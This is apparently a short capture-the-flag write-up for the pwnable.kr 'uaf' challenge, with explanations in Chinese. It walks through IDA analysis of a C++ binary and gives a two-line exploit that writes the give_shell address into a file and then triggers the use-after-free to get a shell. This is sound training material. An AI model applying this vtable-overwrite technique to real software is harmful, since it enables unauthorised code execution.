---
layout:     post
title:      pwnable uaf
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>http://pwnable.kr/  
>  
>Problem Description:  
>Mommy, what is Use After Free bug?  
>Address:  
>ssh uaf@pwnable.kr -p2222 (pw:guest)   
<!-- more -->


### 0x00 IDA分析

直接看源码, case2 处能构造任意写

![](/assets/img/writeup/pwn/2017-08-28-pwnable-uaf/0x00.png)

Human 处的 give_shell 是本次 getshell 的 target

![](/assets/img/writeup/pwn/2017-08-28-pwnable-uaf/0x01.png)

copy 到本地

```
$ scp -P 2222 uaf@pwnable.kr:/home/uaf/uaf ~/toolchain/
```

拖到IDA分析, 先请求分配 0x18 bytes, 返回指针 v3

![](/assets/img/writeup/pwn/2017-08-28-pwnable-uaf/0x02.png)

v3 指向的 18 bytes 的开始 8 bytes 存放 give_shell 的地址

![](/assets/img/writeup/pwn/2017-08-28-pwnable-uaf/0x03.png)
![](/assets/img/writeup/pwn/2017-08-28-pwnable-uaf/0x04.png)

再看看 case1, fastcall +8 调用了 introduce

![](/assets/img/writeup/pwn/2017-08-28-pwnable-uaf/0x05.png)


### 0x01 exploit

利用 uaf 触发 case2 处任意写, 将 &give_shell - 8 写入 v3指针

```
$ python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" > /tmp/give_shell
$ ./uaf 24 "/tmp/give_shell"
```

![](/assets/img/writeup/pwn/2017-08-28-pwnable-uaf/0x06.png)